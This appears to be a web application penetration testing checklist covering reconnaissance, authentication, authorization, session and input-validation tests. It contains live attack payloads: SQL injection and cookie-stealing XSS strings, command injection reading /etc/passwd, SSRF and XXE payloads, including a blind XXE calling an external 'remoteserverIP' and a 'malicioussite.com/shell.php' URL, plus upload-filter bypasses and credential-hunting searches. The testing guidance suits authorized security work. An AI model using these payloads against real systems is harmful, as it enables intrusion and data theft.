## 1. Introduction
> A web application security test focuses only on evaluating the security of a web application. The process involves an active analysis of the application for any weaknesses, technical flaws, or vulnerabilities. Any security issues that are found will be presented to the system owner, together with an assessment of the impact, a proposal for mitigation or a technical solution.

### Testing options:
1. Black-box (Zero Knowledge)
2. Grey-box (Credentials)
3. White-box (Source Code Review)

* External assessment
* Internal assessment

### Assessments prerequists:
1. VPN Access (if needed)
2. Mulitple user account from each available user role
3. Whitelising from security devices

### Testing Methodology
#### Passive Testing
* Understand the application's logic and explores the application as a user (Manually via the browser).
* Use HTTP proxy such as BurpSuite to check all the HTTP requests and response to know more about (HTTP headers, parameters, cookies, APIs, technology usage/patterns, etc).
* Chack the authentication mechanism implemented (if exist).

#### Active Testing
* Information Gathering
* Authentication Testing
* Authorization Testing
* Session Management Testing
* Input Validation Testing
* Other Test Cases (All Categories)

## 2. Information Gathering / Enumeration / Scanning
2.1. Use a search engine to search (Google Dorks) for potentially sensitive information (In external assessment).
```
site:target.com
```
* `site:` will limit the search to the provided domain.
* `inurl:` will only return results that include the keyword in the URL.
* `intitle:` will only return results that have the keyword in the page title.
* `intext:` or `inbody:` will only search for the keyword in the body of pages.
* `filetype:` will match only a specific filetype, i.e. png, or php.

2.2. Use Github enumeration
```
"target.com" password
"target.com" secret
"target.com" credentials
"target.com" token
"target.com" config
"target.com" key
"target.com" pass
"target.com" login
"target.com" ftp
"target.com" pwd
"target.com" security_credentials
"target.com" connectionstring
"target.com" JDBC
"target.com" ssh2_auth_password
"target.com" send_keys
"target.com" send,keys
```
![image](https://user-images.githubusercontent.com/48615614/130426893-0f96a9ac-ae6f-491c-b608-abd36537b165.png)

2.3. Setup HTTP proxy on the browser for the target application using Burpsuite to identify the application entry points and add the target to the scope.

2.4. Retrieve and Analyze the `robot.txt` files (can be found in target.com/robot.txt). 

2.5. Use Fingerprint Tool such as Nmap perform port scan and service Fingerprinting ```nmap -sV -Pn target.com -oA results ```.

2.6. On the application pages do mouse Right-click and check the HTML pages code and look for any useful information such as framework version, credentials, endpoints or any forgoton comments.

2.7. Check the application HTTP response's headers and look for the technology being used such as ```operating system, Web server, versions..etc``` such as the below HTTP response example.
```
HTTP/1.1 200 OK
Server: nginx/1.17.3
Date: Thu, 05 Sep 2019 17:50:24 GMT
Content-Type: text/html
Content-Length: 117
Last-Modified: Thu, 05 Sep 2019 17:40:42 GMT
Connection: close
ETag: "5d71489a-75"
Accept-Ranges: bytes
```
2.8. Check the application HTTP response if important security headers are missing such as:
* ```Strict-Transport-Security```
* ```Content-Security-Policy```
* ```X-XSS-Protection```

2.9. On Burpsuite perform Content Discovery on the target application to crawl the application contents ```right-click on the target > Engagement tools > Discover content```:

![image](https://user-images.githubusercontent.com/48615614/130413453-a6219224-0561-4a80-a6fd-d1061ad3b218.png)

2.10. On burpsuite right-click on the target and click on `actively scan this host` to launch a web application scanning on the target:

![image](https://user-images.githubusercontent.com/48615614/130415447-c759ca86-98a3-4a54-9497-2bb3c4772aa5.png)

2.11. You can use open source web application scanner such as `Nikto` by using `nikto -h target.com`.

2.12. Perform Directory Brute force to identify more/hiddent endpoints, you can use Burpsuite intruder or other open-source tools, as example:
* ```ffuf -w Documents/wordlist/Common.txt -u https://target.com/FUZZ -c -recursion -recursion-depth 5```
* ```dirb https://target.com```

2.13. Perform parameter discovery on the application using `Arjun`, use `python3 arjun.py -u https://target.com --get --post --json -t 22` (one of GET or POST or JSON) this test help you discover hiddent parameters (Optional).

2.14. Check if `OPTIONS` HTTP method has a risky HTTP method enabled such as `PUT` or `DELETE`:

![image](https://user-images.githubusercontent.com/48615614/130425984-73e3ba5a-0844-47a5-a92d-93044577b9a7.png)

## 3. Authentication Testing
3.1 Check if it is possible to `reuse` the session after Logout (on burpsuite send 1 request to the repeater then logout from the application, now on the repeater try to send the same request and check if the session was invalidated or no). also check if the application automatically logs out a user has idle for a certain amount of time.

3.2. Check whether any sensitive information remain stored in browser cache `on the browser click on F12 then go to Storage`:

![image](https://user-images.githubusercontent.com/48615614/130417882-37b9b1ee-c93a-4e1e-8898-37f9a30e6cb6.png)

3.3. Check if it's possible to bypass the authentication using SQL injection by trying true and false condition on the login parameters, for example `' OR 1=1--+`:

![image](https://user-images.githubusercontent.com/48615614/130419286-4acbc6f1-d5f2-4e4b-b9b0-7540c6a3ffbd.png)

3.4. Check if you can access any page that require authentication while you are not authentication to the application such as visting `https://target.com/profile`.

3.5 If the application is using `OTP`, check if you can bypass it by intercepting HTTP login request on Burpsuite and remove the OTP parameter then send the request, if the request was accepted by the web server then it's bypassible.

3.6. If `CAPTCHA` exist, check if you can bypass it by intercepting HTTP login request on Burpsuite and remove the captcha parameter then send the request, if the request was accepted by the web server then it's bypassible.

3.7. For critical applications such as `Web mails or admin portals` check if 2-factor authentication implemented on the login page or not.

3.8. When creating a new account, check if the application accepts weak passwords such as `1234 or password1`.

3.9. Check whether any weak security questions/Answer are presented (if exist).

3.10. Check for default credentials such as `admin/admin` or `root/root`, search for default credentials if the target is a product that has public ducmentation.

3.11. Check if the login page is protected by `SSL/TLS` to make sure that the credentials are not sent over unencrypted channel.

3.12. Check for username enumeration, try to enter a random name, and see the application response if its indicating that the username exist but the password is incorrect, or the application will response with a generic message.

3.13. Test user account lockout mechanism on brute force attack.

## 4. Authorization Testing
4.1. Test the Role and Privilege Manipulation to Access the Resources, for example, if you have normal user account and admin user account, try to access the admin resources using the normal user account, try to perform action that should be done by admins only.

4.2. Try to decode/decrypt the user session cookie, and try to find anything related to the user role/privilege and change it to see if you can get a privilege escalation to a higher privilege role.

4.3. Look for `Insecure direct object references (IDOR)`, means if you found that accessing a specific file has parameter `id=5` try to change the value and check if you can access different resources related to other users, look for all the parameters in `GET` and `POST`.

4.4. Test for `Path Traversal`, by performing input vector enumeration and analyze the input validation functions presented in the web application, you can use burpsuite intruder adn repeater.

4.5. Check if is it possible to access that resource even if you are not authenticated.

4.6. Check if is it possible to access that resource after the log-out.

4.7. Check if is it possible to access functions and resources that should be accessible to a user that holds a different role or privilege.

## 5. Session Management Testing
5.1. Identify actual session cookie out of bulk cookies in the application, as most of the application has many cookies, so you need to identify which one is the session cookie.

5.2 Decode cookies using some standard decoding algorithms such as `Base64`, `hex`, `URL`, etc, you can use Burpsuite decoder tool.

5.3 Modify cookie session token value by 1 bit/byte. Then resubmit and do the same for all tokens. Reduce the amount of work you need to perform in order to identify which part of the token is actually being used and which is not

5.4. Check for session cookies and cookie expiration date/time.

5.5. Check for `HttpOnly` and `Secure` (if the application is over SSL) flags in cookie.

5.6. Check if any user information is stored in cookie value or not If yes, tamper it with other user's data so you can try to escalate your privileges.

5.7. Test the session Fixation, to avoid seal user session (session Hijacking), this can be done to check if you get a new cookie session after you login successfully and its different from the one you had before login. 

5.8. Check for CSRF, and check if the application is missing `anti-csrf` token to prevent such attack.

5.9. check for JSON Web Tokens and determine whether the JWTs expose sensitive information, and determine whether the JWTs can be tampered with or modified https://github.com/me-redteam/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md.


## 6. Input Validation Testing
6.1. Collect as much as you can target's endpoint, check all the endpoints that has parameters, focus on those parameters that retrieve data from backend databases.

6.2. For testing SQL injection, you can start by testing for error based SQLi, you can insert single-quote`'`, double-quote `''`, backtick or semi-colon `;` in each parameter and send it and check the HTTP response for eny SQL errors.

6.3. Check for blind SQL injection by inserting a true/false conditions into the parameters such as `' OR 1=1--` and check if there is any different after sending the request.

6.4. You can run a SQL injection scanner on all requests, simply copy any HTTP request that has parameters and add to a text file and run `sqlmap.py -r Desktop/request.txt` this is a simple test, you can check all `sqlmap` flags such as `--dbs`, `--T`, `--risk`..etc.

6.5. You can more automated tools such as `sqlninja`, `sqldumper` and `sql power injector`.

6.6. Perform Union Query SQL injection testing and Time delays.

6.7. Analyze each input vector to detect potential XSS vulnerabilities.

6.8. For XSS, try to identify any parameters that is reflected on the page so if output is reflected back inside the JavaScript as a value of any variable just check for reflected XSS, you can start insert basic XSS payload such as `'><script>alert(123);</script>` and check the HTTP response, try to check what tags are being filtered so you can try bypass this by using different payloads, try to do some basic encoding `%3cscript%3ealert(document.cookie)%3c/script%3e`.

6.9. Upload a JavaScript using Image file.

6.10. Unusual way to execute your JS payload is to change method from POST to GET, it bypasses filters sometimes

6.11. Check for Stored XSS, if you found any input that is being saved on the server and its reflected on the page, try to add XSS payload and save it to the application, such as add a comment, if you found that the date i being saved to the application and its not reflected on the application, you can try Blind-XSS.

6.12. Look for command injection, when viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement, the user can simply append the Pipe symbol `|` onto the end of the filename, for example `http:/target.com/userData.pl?doc=/bin/ls|`. Also appending a semicolon to the end of a URL for a `.PHP` page followed by an operating system command, will execute the command. `http://target.com/something.php?dir=%3Bcat%20/etc/passwd`

3.13. If you found a `POST` request contains parameters that retriving a file, simply you can inject a command injection for example `Doc=Doc1.pdf` > `Doc=Doc1.pdf+|+Dir c:\`.

3.14. The following special character can be used for command injection such as `|` `;` `&` `$` `>` `<` `'` `!`.

3.15. Look for `SSRF`, when testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious, so if you found a parameter calling for a page file, for example `GET https://target.com/page?page=https://malicioussite.com/shell.php`, or you can access local restricted page `GET https://target.com/page?page=page=http://localhost/admin` or `https://target.com/page?page=page=http://127.0.0.1/admin`.

* Change the content type to `text/xml` then insert below code. Check via burpsuite repeater:
```
<?xml version="1.0" encoding="ISO 8859 1"?>
<!DOCTYPE tushar [
<!ELEMENT tushar ANY
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><tushar>&xxe;</
<!ENTITY xxe SYSTEM "file:///etc/hosts" >]><tushar>&xxe;</
<!ENTITY xxe SYSTEM "file:///proc/self/cmdline" >]><tushar>&xxe;</
<!ENTITY xxe SYSTEM "file:///proc/version" >]><tushar>&xxe;</
```

```
Another SSRF List:
http://[::]:80/
http://[::]:25/
http://[::]:22/
http://[::]:3128/
http://0000::1:80/
http://0000::1:25/
http://0000::1:22/
http://0000::1:3128/
http://127.0.1.3
http://127.0.0.0
http://0177.0.0.1/
http://2130706433/
http://3232235521/
http://3232235777/
```

3.16. Test any parameter that takes URL such as "img_url", "redirect", check first if the vulnerable parameter can communicate with external server.

```
SSRF to LFI:
https://target.com/img.php?img_url=file:///etc/passwd
file:///c:/boot.ini
file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd
ssrf.php?url=file:///etc/passwd
```

3.17. If the application is sending any HTTP requests that contains `XML`, try to look for `XML/XXE injection`  
```
No instead of sending a text, we can try external ENTITY (file:///c:/boot.ini) for Windows OS :
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <name>mo</name>
  <email>&xxe;</name>
</root>
```

3.18. SSRF through XXE

```
Allow outsider to force the server to initiate a Request to internal recourses

<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.196.254">]>
<root>
  <name>mo</name>
  <email>&xxe;</name>
</root>
```

3.19. Advanced XXE (Blind XXE), using Parameter ENTITY to enforce the server to make a call to my server and check if my server getting requests or not.
Parameter ENTITY can be only used within the DTD, we can use the below payload to check for Blind XXE.

```
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [<!ENTITY % remote SYSTEM "http://remoteserverIP/index.html">%remote;]>
```

3.20. You can check for other injection attacks such as `LDAP injection`, `LFI and RFI`, `Server Side Template Injection`, `Host Header Injection`..etc check https://github.com/me-redteam/wstg/tree/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing.


## 7. Other Test Cases (All Categories)
* File Upload Testing

9.1. Test for `Upload of Unexpected File Types`, you need to verify that the unexpected file types are rejected and handled safely, for example if a website has upload function that ask to upload `pdf` files only, you can try to upload any other file types such as `.php`, `.aspx`..etc https://www.aptive.co.uk/blog/unrestricted-file-upload-testing.

9.2. Try to bypass any upload types filters by using `Null Byte (%00) Bypass` > `file.pdf%00`  or by double extension > `file.php.pdf`.

9.3. Change the capitalisation of the extension, such as `file.PhP` or `file.AspX`.

9.4. Change the extensions to a less common extension, such as `file.php5`, `file.shtml`, `file.asa`, `file.jsp`, `file.jspx`, `file.aspx`, `file.asp`, `file.phtml`, `file.cshtml`.

9.5. Using special trailing characters such as spaces, dots or null characters such as `file.asp...`, `file.php;jpg`, `file.asp%00.jpg`, `1.jpg%00.php`.

9.6. Check if the website only check the file type by `Content-Type` in HTTP request.

9.7. Check if the website only do file type check in client-side JavaScript and check if the website only check by the file extension.

9.8. Check for uploading a malicious file types, such as uploading a file contains shellcode.

* Contact Us Form Testing

9.9. Is CAPTCHA implemented on contact us form in order to restrict email flooding attacks.

9.10. Check if it allow to upload file on the server.

9.11. Try to test for `blind XSS` by injecting a XSS payload into the contact us form and check if there are any response coming to your server.

* Forgot Password Testing

9.12. Check for failure to invalidate session on Logout and Password reset.

9.13. Check if forget password reset link/code uniqueness.

9.14. Check if reset link does get expire or not, if its not used by the user for certain amount of time.

9.15. Find user account identification parameter and tamper Id or parameter value to change other user's password.

9.16. If reset link has another param such as date and time, then. Change date and time value in order to make active & valid reset link.

9.17. Submit for two password reset link and use the older one from user's email and check if its still valid or no.

9.18. Check if active session gets destroyed upon changing the password or not.

9.19. Send continuous forget password requests so that it may send sequential tokens.

* JavaScript Files Analysis

9.20. Analyze the application JavaScript files so you can identify hidden endpoints or you can find more interesting details, you can use `JSFScan -l alive.txt -e -s -m -o output/` download the toold from this link `https://github.com/KathanP19/JSFScan.sh`.

* Subdomain Takeover

9.21. Use `subjack` tool to look for any subdomain takeover flaws, you can use `subjack -w all-domains.txt -t 100 -timeout 30 -o subTakeover/results.txt -ssl`.


* Subdomain Enumeration

9.22. Use on of the below tools:
```
1. amass enum -passive -d target.com >> amass.txt 
2. assetfinder --subs-only target.com
3. subfinder -d target.com >> subfinder.txt
```

* Single Sign-On SSO Testing

9.23. If `target.com/internal` redirects you to SSO e.g. Google login, try to insert `public` Before `internal` e.g. `target.com/public/internal` to gain access internal.

9.24. If `internal.target.com` redirects you to SSO e.g. `auth.target.com`, you can do FUZZ on `Internal.target.com`.

9.25. Try to craft `SAML` request with token and send it to the server and figure out how server interact with this.

9.26. Try to inject `XXE` payloads at the top of the `SAML` response.

9.27. While testing `SSO` try to search in burpsuite about URLs in cookie header e.g. `host=ip`, if there is try to change IP to your IP to get `SSRF`.


* CAPTCHA Testing

9.28. Send old captcha value.

9.29. Send old captcha value with old session ID.

9.30. Remove captcha with any adblocker and request again.

9.31. Change from POST to GET.

9.32. Remove captcha parameter from the HTTP request.

9.33. Convert `JSON` request to normal.


* Test For Weak Cryptography

9.34. Test for weak `SSL/TLS` transport layer protection, simply you can scan the application using `sslscan target.com` https://github.com/rbsec/sslscan.

9.35. Check if the sensititve pages such as login pages or pages has credeit card numbers is missing secure `SSL/TLS` connection.


